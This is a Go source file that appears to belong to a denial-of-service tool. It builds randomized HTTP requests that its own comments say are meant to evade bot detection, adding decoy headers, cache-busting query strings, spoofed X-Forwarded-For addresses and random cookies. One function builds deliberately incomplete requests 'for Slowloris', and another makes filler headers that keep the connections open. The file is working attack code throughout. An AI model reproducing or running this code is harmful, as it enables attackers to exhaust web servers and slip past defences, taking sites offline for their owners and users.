package strategy

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
)

// HeaderRandomizer provides realistic HTTP header randomization
// to evade bot detection systems.
type HeaderRandomizer struct {
	ShuffleOrder    bool
	AddDecoyHeaders bool
	VaryAccept      bool
}

// DefaultHeaderRandomizer returns a randomizer with all features enabled.
func DefaultHeaderRandomizer() *HeaderRandomizer {
	return &HeaderRandomizer{
		ShuffleOrder:    true,
		AddDecoyHeaders: true,
		VaryAccept:      true,
	}
}

// HeaderSet represents a collection of HTTP headers with ordering.
type HeaderSet struct {
	headers []headerPair
}

type headerPair struct {
	key   string
	value string
}

// NewHeaderSet creates a new empty header set.
func NewHeaderSet() *HeaderSet {
	return &HeaderSet{
		headers: make([]headerPair, 0, 16),
	}
}

// Add appends a header to the set.
func (h *HeaderSet) Add(key, value string) {
	h.headers = append(h.headers, headerPair{key: key, value: value})
}

// Shuffle randomizes the order of headers.
func (h *HeaderSet) Shuffle() {
	rand.Shuffle(len(h.headers), func(i, j int) {
		h.headers[i], h.headers[j] = h.headers[j], h.headers[i]
	})
}

// String converts headers to HTTP format.
func (h *HeaderSet) String() string {
	var sb strings.Builder
	for _, hp := range h.headers {
		sb.WriteString(hp.key)
		sb.WriteString(": ")
		sb.WriteString(hp.value)
		sb.WriteString("\r\n")
	}
	return sb.String()
}

// BuildGETRequest builds a complete GET request with randomized headers.
func (r *HeaderRandomizer) BuildGETRequest(parsedURL *url.URL, userAgent string) string {
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	hs := NewHeaderSet()

	// Required headers
	hs.Add("Host", parsedURL.Host)
	hs.Add("User-Agent", userAgent)

	// Accept headers with variation
	hs.Add("Accept", r.randomAccept())
	hs.Add("Accept-Language", r.randomAcceptLanguage())
	hs.Add("Accept-Encoding", r.randomAcceptEncoding())

	// Connection
	hs.Add("Connection", "keep-alive")

	// Decoy headers (realistic browser headers)
	if r.AddDecoyHeaders {
		r.addDecoyHeaders(hs)
	}

	// Shuffle if enabled
	if r.ShuffleOrder {
		hs.Shuffle()
	}

	return fmt.Sprintf("GET %s?%d HTTP/1.1\r\n%s\r\n",
		path,
		rand.Intn(100000),
		hs.String(),
	)
}

// BuildPOSTRequest builds a complete POST request with randomized headers.
func (r *HeaderRandomizer) BuildPOSTRequest(parsedURL *url.URL, userAgent string, contentLength int, contentType string) string {
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	hs := NewHeaderSet()

	// Required headers
	hs.Add("Host", parsedURL.Host)
	hs.Add("User-Agent", userAgent)
	hs.Add("Content-Type", contentType)
	hs.Add("Content-Length", fmt.Sprintf("%d", contentLength))

	// Accept headers
	hs.Add("Accept", r.randomAccept())
	hs.Add("Accept-Language", r.randomAcceptLanguage())
	hs.Add("Accept-Encoding", r.randomAcceptEncoding())

	// Connection
	hs.Add("Connection", "keep-alive")

	// Decoy headers
	if r.AddDecoyHeaders {
		r.addDecoyHeaders(hs)
	}

	// Shuffle if enabled
	if r.ShuffleOrder {
		hs.Shuffle()
	}

	return fmt.Sprintf("POST %s?r=%d HTTP/1.1\r\n%s\r\n",
		path,
		rand.Intn(100000),
		hs.String(),
	)
}

// BuildIncompleteRequest builds an incomplete request for Slowloris.
// Note: Does NOT include final \r\n to keep request pending.
func (r *HeaderRandomizer) BuildIncompleteRequest(parsedURL *url.URL, userAgent string) string {
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	hs := NewHeaderSet()

	// Required headers
	hs.Add("Host", parsedURL.Host)
	hs.Add("User-Agent", userAgent)

	// Accept headers
	hs.Add("Accept", r.randomAccept())
	hs.Add("Accept-Language", r.randomAcceptLanguage())
	hs.Add("Accept-Encoding", r.randomAcceptEncoding())

	// Connection
	hs.Add("Connection", "keep-alive")

	// Decoy headers
	if r.AddDecoyHeaders {
		r.addDecoyHeaders(hs)
	}

	// Shuffle if enabled
	if r.ShuffleOrder {
		hs.Shuffle()
	}

	// No trailing \r\n - request stays incomplete
	return fmt.Sprintf("GET %s?%d HTTP/1.1\r\n%s",
		path,
		rand.Intn(100000),
		hs.String(),
	)
}

func (r *HeaderRandomizer) addDecoyHeaders(hs *HeaderSet) {
	// Sec-Fetch headers (modern browsers)
	if rand.Intn(2) == 0 {
		hs.Add("Sec-Fetch-Dest", randomChoice([]string{"document", "empty", "image"}))
		hs.Add("Sec-Fetch-Mode", randomChoice([]string{"navigate", "cors", "no-cors"}))
		hs.Add("Sec-Fetch-Site", randomChoice([]string{"none", "same-origin", "cross-site"}))
	}

	// DNT (Do Not Track)
	if rand.Intn(3) == 0 {
		hs.Add("DNT", "1")
	}

	// Upgrade-Insecure-Requests
	if rand.Intn(2) == 0 {
		hs.Add("Upgrade-Insecure-Requests", "1")
	}

	// Cache control variations
	cacheOptions := []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"",
	}
	if cache := randomChoice(cacheOptions); cache != "" {
		hs.Add("Cache-Control", cache)
	}

	// Pragma (for older compatibility)
	if rand.Intn(4) == 0 {
		hs.Add("Pragma", "no-cache")
	}

	// X-Requested-With (AJAX-like)
	if rand.Intn(5) == 0 {
		hs.Add("X-Requested-With", "XMLHttpRequest")
	}

	// Random referer
	if rand.Intn(3) == 0 {
		referers := []string{
			"https://www.google.com/",
			"https://www.bing.com/",
			"https://duckduckgo.com/",
			"https://www.facebook.com/",
			"https://twitter.com/",
		}
		hs.Add("Referer", randomChoice(referers))
	}
}

func (r *HeaderRandomizer) randomAccept() string {
	if !r.VaryAccept {
		return "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	}

	accepts := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"*/*",
		"text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
	}
	return randomChoice(accepts)
}

func (r *HeaderRandomizer) randomAcceptLanguage() string {
	langs := []string{
		"en-US,en;q=0.5",
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"en;q=0.9",
		"en-US,en;q=0.9,ko;q=0.8",
		"en-US,en;q=0.9,ja;q=0.8",
		"en-US,en;q=0.9,zh-CN;q=0.8",
	}
	return randomChoice(langs)
}

func (r *HeaderRandomizer) randomAcceptEncoding() string {
	if !r.VaryAccept {
		return "gzip, deflate"
	}

	encodings := []string{
		"gzip, deflate",
		"gzip, deflate, br",
		"gzip, deflate, br, zstd",
		"gzip",
		"identity",
	}
	return randomChoice(encodings)
}

func randomChoice(choices []string) string {
	return choices[rand.Intn(len(choices))]
}

// GenerateDummyHeader generates a random header for keep-alive purposes.
func GenerateDummyHeader() string {
	headerType := rand.Intn(6)

	switch headerType {
	case 0:
		return fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000))
	case 1:
		return fmt.Sprintf("X-%d: %d\r\n", rand.Intn(1000), rand.Intn(5000))
	case 2:
		return fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
			rand.Intn(255)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
	case 3:
		letters := "abcdefghijklmnopqrstuvwxyz0123456789"
		cookie := make([]byte, 16)
		for i := range cookie {
			cookie[i] = letters[rand.Intn(len(letters))]
		}
		return fmt.Sprintf("Cookie: sess=%s\r\n", string(cookie))
	case 4:
		headerNames := []string{"Cache-Control", "Pragma", "DNT", "Upgrade-Insecure-Requests"}
		headerName := headerNames[rand.Intn(len(headerNames))]
		return fmt.Sprintf("X-%s: %d\r\n", headerName, rand.Intn(99999))
	default:
		return fmt.Sprintf("X-Request-ID: %d\r\n", rand.Intn(999999999))
	}
}
